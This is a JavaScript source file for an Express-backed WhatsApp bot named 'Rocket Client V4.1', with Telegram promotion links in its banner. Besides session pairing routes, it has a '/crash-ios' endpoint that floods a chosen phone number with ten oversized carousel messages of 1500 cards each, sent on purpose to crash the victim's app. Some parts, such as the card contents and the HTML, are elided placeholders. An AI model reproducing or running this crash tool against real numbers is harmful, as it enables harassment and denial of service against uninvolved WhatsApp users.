// index.js
const {
  generateWAMessageFromContent,
  getAggregateVotesInPollMessage,
  downloadContentFromMessage,
  useMultiFileAuthState,
  generateWAMessage,
  makeInMemoryStore,
  DisconnectReason,
  areJidsSameUser,
  getContentType,
  decryptPollVote,
  makeWASocket,
  relayMessage,
  jidDecode,
  Browsers,
  proto
} = require("@angstvorfrauen/baileys");
const gradient = require("gradient-string");
const crypto = require("crypto");
const cfonts = require("cfonts");
const figlet = require("figlet");
const path = require("path");
const pino = require("pino");
const os = require("os");
const fs = require("fs");
const Boom = require("@hapi/boom");
const express = require("express");
const app = express();

app.use(express.json());

// === CONFIGURAÇÕES ===
const banner = cfonts.render("Rocket\nClient\nV4.1", {
  font: "block",
  align: "center",
  colors: ["#ff0000", "#C00000"],
  background: "transparent",
  letterSpacing: 1,
  lineHeight: 1,
  space: true,
  maxLength: "0",
  gradient: true,
  independentGradient: false,
  transitionGradient: true,
  env: "node"
});

const terminalWidth = process.stdout.columns || 80;

function centerText(text) {
  const padding = Math.floor((terminalWidth - text.length) / 2);
  const spaces = " ".repeat(Math.max(0, padding));
  const grad = gradient.gradient(['#ff0000', '#C00000']);
  return spaces + grad(text);
}

// === BANNER ===
figlet.text("RC", { font: "Bloody" }, (err, data) => {
  if (err || !data) {
    data = figlet.textSync("RC", { font: "Standard" });
  }
  const lines = data.split("\n");
  const centeredLines = lines.map(line => {
    const padding = Math.max(0, Math.floor((terminalWidth - line.length) / 2));
    return " ".repeat(padding) + line;
  });
  const grad = gradient.gradient(['#ff0000', '#C00000']);
  console.log(grad(centeredLines.join("\n")));

  ["https://t.me/Einzelhandelskaufmann", "https://t.me/RocketClient2", "MadeByXeuka\n"].forEach(text => {
    const padding = Math.max(0, Math.floor((terminalWidth - text.length) / 2));
    console.log(grad(" ".repeat(padding) + text));
  });
});

// === BAILEYS ===
let sock;
let sessionExists = false;

async function connectBot() {
  const { state, saveCreds } = await useMultiFileAuthState("./database/Session");
  sock = makeWASocket({
    printQRInTerminal: false,
    auth: state,
    logger: pino({ level: "silent" }),
  });

  sessionExists = sock.authState.creds.registered;

  sock.ev.on("messages.upsert", async chatUpdate => {
    let message = chatUpdate.messages[0];
    if (!message.message) return;
    message.message = (Object.keys(message.message)[0] === "ephemeralMessage")
        ? message.message.ephemeralMessage.message
        : message.message;
    if (message.key && message.key.remoteJid === "status@broadcast") return;
    if (message.key.id.startsWith("BAE5")) return;
    require("./main.js")(sock, message, chatUpdate);
  });

  sock.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (decode.user && decode.server ? `${decode.user}@${decode.server}` : jid);
    } else {
      return jid;
    }
  };

  sock.public = true;

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      let reason = Boom.boomify(lastDisconnect?.error)?.output.statusCode;
      sessionExists = false;
      switch (reason) {
        case DisconnectReason.badSession:
          fs.rmSync("./database/Session", { recursive: true, force: true });
          connectBot();
          break;
        case DisconnectReason.loggedOut:
          fs.rmSync("./database/Session", { recursive: true, force: true });
          connectBot();
          break;
        default:
          connectBot();
      }
    } else if (connection === "open") {
      sessionExists = true;
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
}
connectBot();

// === ROTAS WEB ===
app.get('/', (req, res) => {
  const isConnected = sessionExists;
  const connectButton = isConnected
    ? `<button disabled style="background:#666;cursor:not-allowed;">Sessão Ativa</button><p style="color:#0f0;">Bot já conectado!</p>`
    : `<button onclick="connect()">Conectar</button><div id="code"></div>`;

  const html = `<!DOCTYPE html>...`; // (mesmo HTML de antes)
  res.send(html);
});

// === APIs (connect, deleteSession, crash-ios, docs) ===
app.get('/status', (req, res) => res.json({ connected: sessionExists }));

app.get('/connect', async (req, res) => {
  const token = req.query.token;
  if (token !== '@xd') return res.status(401).json({ error: 'Token inválido' });
  if (sessionExists) return res.status(400).json({ error: 'Sessão já existe' });
  const phoneNumber = req.query.query?.replace(/[^0-9]/g, '');
  if (!phoneNumber) return res.status(400).json({ error: 'Número inválido' });

  try {
    let code = await sock.requestPairingCode(phoneNumber);
    code = code?.match(/.{1,4}/g)?.join("-") || code;
    res.json({ success: true, code });
  } catch (err) {
    res.status(500).json({ error: 'Erro ao gerar código', details: err.message });
  }
});

app.get('/deleteSession', (req, res) => {
  const token = req.query.token;
  if (token !== '@xd') return res.status(401).json({ error: 'Token inválido' });
  fs.rmSync("./database/Session", { recursive: true, force: true });
  sessionExists = false;
  connectBot();
  res.json({ success: 'Sessão deletada com sucesso' });
});

const { url = "https://i.imgur.com/xyz.jpg", fileSha256 = "abc", mediaKey = "abc", fileEncSha256 = "abc", directPath = "/abc", jpegThumbnail = "data:image/jpeg;base64,/9j/..." } = require("./database/mediaall.js") || {};

app.get('/crash-ios', async (req, res) => {
  const token = req.query.token;
  if (token !== '@xd') return res.status(401).json({ error: 'Token inválido' });
  if (!sessionExists) return res.status(400).json({ error: 'Bot não conectado' });
  const query = req.query.query?.replace(/[^0-9]/g, '');
  if (!query) return res.status(400).json({ error: 'Número inválido' });

  const target = query + '@s.whatsapp.net';
  try {
    for (let i = 0; i < 10; i++) {
      const singleCard = { /* ... mesmo de antes ... */ };
      const card = Array(1500).fill(singleCard);
      await sock.sendjson(target, { interactiveMessage: { body: { text: "." }, carouselMessage: { cards: card } } });
    }
    res.json({ success: true, target, message: "Crash enviado com sucesso" });
  } catch (error) {
    res.status(500).json({ error: 'Falha ao enviar crash', details: error.message });
  }
});

app.get('/docs', (req, res) => {
  const docs = `<!DOCTYPE html>...`; // (mesma docs)
  res.send(docs);
});

// === SERVIDOR ===
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(centerText(`Server running on http://localhost:${PORT}`));
  console.log(centerText(`Docs: http://localhost:${PORT}/docs`));
});
